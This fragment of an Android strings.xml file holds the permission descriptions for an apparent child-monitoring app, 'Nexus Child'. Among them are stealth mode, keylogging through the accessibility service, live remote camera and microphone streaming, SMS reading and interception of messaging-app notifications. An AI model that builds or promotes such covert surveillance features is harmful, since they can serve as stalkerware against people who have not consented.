    <!-- Dedicated Permission Descriptions -->
    <string name="perm_camera_title">Camera Access</string>
    <string name="perm_camera_desc">Enables remote real-time video streaming from front and back cameras for visual surveillance.</string>

    <string name="perm_mic_title">Microphone Access</string>
    <string name="perm_mic_desc">Captures ambient environmental audio to monitor the surroundings of the child device in real time.</string>

    <string name="perm_location_title">Location Tracking</string>
    <string name="perm_location_desc">Provides high-precision GPS positioning and breadcrumb tracking to monitor child movements.</string>

    <string name="perm_call_logs_title">Call Logs</string>
    <string name="perm_call_logs_desc">Grants access to incoming, outgoing, and missed call records including phone numbers, durations, and timestamps.</string>

    <string name="perm_contacts_title">Contacts</string>
    <string name="perm_contacts_desc">Synchronizes the device address book so the parent dashboard can identify callers and message correspondents.</string>

    <string name="perm_phone_title">Phone State</string>
    <string name="perm_phone_desc">Permits monitoring cellular connections, active call status, SIM card carrier details, and phone telemetry.</string>

    <string name="perm_sms_title">SMS Messages</string>
    <string name="perm_sms_desc">Enables reading and auditing incoming and outgoing SMS text messages for communication safety.</string>

    <string name="perm_photos_videos_title">Photos and Videos</string>
    <string name="perm_photos_videos_desc">Allows the parent dashboard to audit and inspect stored gallery photos, screenshots, and video recordings.</string>

    <string name="perm_music_audio_title">Music and Audio</string>
    <string name="perm_music_audio_desc">Enables access to audio files, voice recordings, sound clips, and audio media stored on the device.</string>

    <string name="perm_notifications_runtime_title">Notifications</string>
    <string name="perm_notifications_runtime_desc">Allows the background surveillance agent to display essential persistent service status notifications.</string>

    <string name="perm_storage_title">All Files Access</string>
    <string name="perm_storage_desc">Grants deep file manager access across internal storage to browse, retrieve, and inspect documents.</string>

    <string name="perm_battery_title">Battery Optimization</string>
    <string name="perm_battery_desc">Disables Android OS aggressive power saving so the WebRTC signaling and background monitoring keep running without interruptions.</string>

    <string name="perm_accessibility_title">Accessibility Service</string>
    <string name="perm_accessibility_desc">Grants deep system inspection, stealth UI management, keylogging, and remote interaction capabilities.</string>

    <string name="perm_notifications_title">Notification Listener</string>
    <string name="perm_notifications_desc">Intercepts and mirrors incoming notifications from apps like WhatsApp, Telegram, and Messages directly to the parent dashboard.</string>

    <!-- Auto-Start Permission Strings -->
    <string name="perm_autostart_title">Auto-Start Permission</string>
    <string name="perm_autostart_desc">Enables system background auto-start privileges so Nexus Child automatically resumes on device restart, unlock, or memory clearing.</string>

    <!-- Display Over Other Apps Strings -->
    <string name="perm_overlay_title">Display Over Other Apps</string>
    <string name="perm_overlay_desc">Allows background screen streaming prompts and essential security alerts to display even when running in the background or stealth mode.</string>

    <!-- Digital Wellbeing Usage Access Strings -->
    <string name="perm_usage_access_title">Usage Access</string>
    <string name="perm_usage_access_desc">Grants Digital Wellbeing monitoring access to daily screen time, app usage durations, launch counts, and device unlocks.</string>

